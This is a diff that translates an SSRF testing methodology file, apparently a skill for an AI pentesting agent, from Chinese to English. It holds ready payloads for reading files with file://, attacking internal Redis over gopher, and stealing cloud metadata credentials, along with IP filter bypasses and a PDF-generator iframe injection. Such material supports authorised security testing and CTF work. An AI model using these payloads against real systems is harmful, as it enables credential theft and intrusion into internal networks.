@@ -1,29 +1,33 @@
 ---
 name: ssrf-methodology
-description: "服务端请求伪造(SSRF)的检测与利用方法论。当目标有 URL 获取/预览/导入功能、PDF 生成、Webhook、远程图片加载、RSS 导入时使用。包含 IP 过滤绕过大全、协议利用(file/gopher/dict)、云元数据窃取、内网服务探测。即使参数名看起来无害（如 src、callback、next），只要涉及服务端发起请求的场景都应加载此 skill。"
+description: "Server-Side Request Forgery (SSRF) detection and exploitation methodology. Use when the target offers URL fetch/preview/import, PDF generation, webhooks, remote image loading, or RSS import. Includes a complete IP filter bypass collection, protocol exploitation (file/gopher/dict), cloud metadata theft, and internal service probing. Even when the parameter name looks harmless (such as src, callback, or next), load this skill for any scenario where the server initiates the request"
+zh-signals: "系统性开展 SSRF 检测与利用，涵盖 IP 过滤绕过、协议利用、云元数据窃取与内网服务探测。信号:SSRF,内网探测,云元数据,协议利用,IP绕过"
+when-to-use: >-
+  Use when a target has URL fetch/preview/import, PDF generation, webhook, or remote image
+  loading that may let the server initiate requests.
 metadata:
   tags: "ssrf,server-side request forgery,internal-network,file-read,gopher,metadata,ip-bypass,cloud-metadata,webhook,gopherus"
   category: "exploit"
 ---
 
-# SSRF 攻击方法论
+# SSRF Attack Methodology
 
-## 深入参考
+## Further Reading
 
-- IP 过滤绕过完整列表、云元数据路径、协议利用详细命令 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
-- 云 SSRF 进阶（容器/Serverless 凭据/K8s 横向/绕过技术） → [references/cloud-ssrf.md](references/cloud-ssrf.md)
-- Gopher 协议 payload 生成与实战组合链 → [references/gopherus-payloads.md](references/gopherus-payloads.md)
+- Complete IP filter bypass list, cloud metadata paths, detailed protocol exploitation commands → [references/ssrf-bypass.md](references/ssrf-bypass.md)
+- Advanced cloud SSRF (container / serverless credentials / K8s lateral movement / bypass techniques) → [references/cloud-ssrf.md](references/cloud-ssrf.md)
+- Gopher protocol payload generation and practical combination chains → [references/gopherus-payloads.md](references/gopherus-payloads.md)
 
 ---
 
-## Phase 1: 发现 SSRF 入口
+## Phase 1: Discover SSRF Entry Points
 
-**参数名线索**（高度可疑）：
+**Parameter name clues** (highly suspicious):
 `url`, `uri`, `path`, `src`, `dest`, `redirect`, `callback`, `next`, `data`, `reference`, `site`, `html`, `imageUrl`, `feed`, `target`, `proxy`, `link`
 
-**功能线索**：URL 预览、PDF/图片生成（wkhtmltopdf, puppeteer）、Webhook、远程图片获取、RSS 导入
+**Feature clues**: URL preview, PDF/image generation (wkhtmltopdf, puppeteer), webhooks, remote image fetching, RSS import
 
-## Phase 2: 基础 SSRF 验证
+## Phase 2: Basic SSRF Validation
 
 ```
 url=http://127.0.0.1/
@@ -31,47 +35,47 @@ url=http://localhost/
 url=http://127.0.0.1:PORT/
 ```
 
-响应差异判断：内容变化 → 有回显 SSRF | 只有状态码 → 半盲 | 无差异 → 全盲
+Judge by response differences: content changes → SSRF with output | status code only → blind | no difference → fully blind
 
-**陷阱**：应用可能过滤 `127.0.0.1` 但放行变体 → 需要绕过（[references/ssrf-bypass.md](references/ssrf-bypass.md)）
+**Trap**: the application may filter `127.0.0.1` but allow variants → you need a bypass ([references/ssrf-bypass.md](references/ssrf-bypass.md))
 
-## Phase 3: 协议利用速查
+## Phase 3: Protocol Exploitation Quick Reference
 
 ```
-url=file:///etc/passwd       # 文件读取（最高价值）
+url=file:///etc/passwd       # file read (highest value)
 url=file:///flag.txt
-url=gopher://127.0.0.1:6379/ # 攻击内部 Redis（⚠️ PHP curl 可用, Python requests 不可用）
+url=gopher://127.0.0.1:6379/ # attack an internal Redis (⚠️ works with PHP curl, not with Python requests)
 url=dict://127.0.0.1:6379/info
 ```
 
-## Phase 4: 云元数据速查
+## Phase 4: Cloud Metadata Quick Reference
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
-http://metadata.google.internal/computeMetadata/v1/                 # GCP (需 Header)
-http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (需 Header)
+http://metadata.google.internal/computeMetadata/v1/                 # GCP (requires Header)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure (requires Header)
 ```
 
-## Phase 5: 利用决策树
+## Phase 5: Exploitation Decision Tree
 
 ```
-SSRF 入口确认
-├─ 有回显？ → 直接读内容/探测端口
-│  ├─ file:// 可用？ → 读取敏感文件（/etc/passwd, /flag.txt, /app/config.py）
-│  ├─ 云环境？ → 查询元数据获取凭据 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
-│  └─ 内网服务？ → 探测 Redis/ES/MongoDB → gopher 利用
-├─ 半盲/全盲？
-│  ├─ 端口扫描 → 状态码/响应时间差异
-│  └─ 外带 → DNS 外带 / 延时差异
-├─ IP 过滤？ → 编码绕过 → [references/ssrf-bypass.md](references/ssrf-bypass.md)
-└─ 协议限制？ → 检查 HTTP-only vs 全协议
+SSRF entry point confirmed
+├─ Output returned? → read content directly / probe ports
+│  ├─ file:// usable? → read sensitive files (/etc/passwd, /flag.txt, /app/config.py)
+│  ├─ Cloud environment? → query metadata for credentials → [references/ssrf-bypass.md](references/ssrf-bypass.md)
+│  └─ Internal services? → probe Redis/ES/MongoDB → gopher exploitation
+├─ Blind / fully blind?
+│  ├─ Port scanning → status code / response time differences
+│  └─ Out-of-band → DNS exfiltration / timing differences
+├─ IP filtering? → encoding bypass → [references/ssrf-bypass.md](references/ssrf-bypass.md)
+└─ Protocol restrictions? → check HTTP-only vs full protocol support
 ```
 
-## 协议与库限制
+## Protocol and Library Limitations
 
-不同实现支持的协议不同，不是所有 SSRF 都支持所有协议：
+Different implementations support different protocols — not every SSRF supports every protocol:
 
-| 库/环境 | file:// | gopher:// | dict:// |
+| Library / Environment | file:// | gopher:// | dict:// |
 |---------|---------|-----------|---------|
 | PHP curl | ✅ | ✅ | ✅ |
 | Python requests | ❌ | ❌ | ❌ |
@@ -79,11 +83,11 @@ SSRF 入口确认
 | Java URLConnection | ✅ | ❌ | ❌ |
 | Node.js fetch | ❌ | ❌ | ❌ |
 
-**IP 短格式绕过**：`127.1`、`127.0.1`（省略 0）
+**Short-form IP bypass**: `127.1`, `127.0.1` (zeroes omitted)
 
-## 注意事项
+## Notes
 
-- **file:// 是最高价值协议**：直接读取服务器文件
-- **Gopher 陷阱**：PHP curl 支持 gopher，Python requests 不支持
-- **SSRF 和 XXE 经常组合**：XXE 中的 SYSTEM 就是 SSRF
-- **PDF 生成器 SSRF**：wkhtmltopdf/puppeteer 生成 PDF 时会加载外部资源，注入 `<iframe src="file:///etc/passwd">` 或 `<img src="http://127.0.0.1/">`
+- **file:// is the highest-value protocol**: it reads server files directly
+- **Gopher trap**: PHP curl supports gopher, Python requests does not
+- **SSRF and XXE are often combined**: the SYSTEM entity in XXE is SSRF
+- **PDF generator SSRF**: wkhtmltopdf/puppeteer loads external resources while rendering a PDF, so injecting `<iframe src="file:///etc/passwd">` or `<img src="http://127.0.0.1/">` works
